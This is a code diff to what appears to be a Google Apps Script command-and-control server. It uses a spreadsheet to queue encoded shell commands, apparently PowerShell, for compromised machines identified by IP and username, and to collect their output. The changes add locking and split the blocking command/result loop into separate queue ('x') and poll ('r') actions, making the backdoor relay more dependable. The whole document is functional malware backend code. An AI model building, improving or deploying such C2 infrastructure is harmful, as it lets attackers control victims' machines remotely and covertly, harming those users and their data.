@@ -10,17 +10,23 @@ function err() {
 }
 
 function get_cmd(ip, user) {
+  var lock = LockService.getScriptLock();
+  lock.waitLock(10000);
   var data = SHEET.getDataRange().getValues();
   for (var row = 0; row < data.length; row++) {
     if ((data[row][0] === ip) && (data[row][1] === user)) {
+      lock.releaseLock();
       return data[row][2];
     }
   }
   SHEET.appendRow([ip, user, 'ZQB4AGkAdAA=', '']);
+  lock.releaseLock();
   return 'ZQB4AGkAdAA='; // exit command
 }
 
 function set_cmd(ip, user, cmd) {
+  var lock = LockService.getScriptLock();
+  lock.waitLock(10000);
   var data = SHEET.getDataRange().getValues();
   for (var row = 0; row < data.length; row++) {
     if ((data[row][0] === ip) && (data[row][1] === user)) {
@@ -28,25 +34,33 @@ function set_cmd(ip, user, cmd) {
       SHEET.getRange(row + 1, 4).setValue('');
     }
   }
+  lock.releaseLock();
 }
 
 function get_result(ip, user) {
+  var lock = LockService.getScriptLock();
+  lock.waitLock(10000);
   var data = SHEET.getDataRange().getValues();
   for (var row = 0; row < data.length; row++) {
     if ((data[row][0] === ip) && (data[row][1] === user)) {
+      lock.releaseLock();
       return data[row][3];
     }
   }
+  lock.releaseLock();
   return '';
 }
 
 function set_result(ip, user, result) {
+  var lock = LockService.getScriptLock();
+  lock.waitLock(10000);
   var data = SHEET.getDataRange().getValues();
   for (var row = 0; row < data.length; row++) {
     if ((data[row][0] === ip) && (data[row][1] === user)) {
       SHEET.getRange(row + 1, 4).setValue(result);
     }
   }
+  lock.releaseLock();
 }
 
 function doPost(e) {
@@ -62,7 +76,6 @@ function doPost(e) {
         }
       default:
         return err();
-        break;
     }
   } catch (error) {
     return err();
@@ -78,25 +91,24 @@ function doGet(e) {
         return ContentService.createTextOutput(cmd);
       case 'l':
         var res = [];
+        var lock = LockService.getScriptLock();
+        lock.waitLock(10000);
         var data = SHEET.getDataRange().getValues();
+        lock.releaseLock();
         for (var row = 0; row < data.length; row++) {
           res.push(data[row][0]);
           res.push(data[row][1]);
         }
         return ContentService.createTextOutput(res.join('|'));
+      case 'x':
+        var d = e.parameter['x'].split('|');
+        set_cmd(d[0], d[1], d[2]);
+        return ContentService.createTextOutput('ok');
       case 'r':
         var d = e.parameter['r'].split('|');
-        set_cmd(d[0], d[1], d[2]);
-        // wait until done
-        while (1) {
-          var r = get_result(d[0], d[1]);
-          if (r != '') {
-            return ContentService.createTextOutput(r);
-          }
-        }
+        return ContentService.createTextOutput(get_result(d[0], d[1]));
       default:
         return err();
-        break;
     }
   } catch (error) {
     return err();
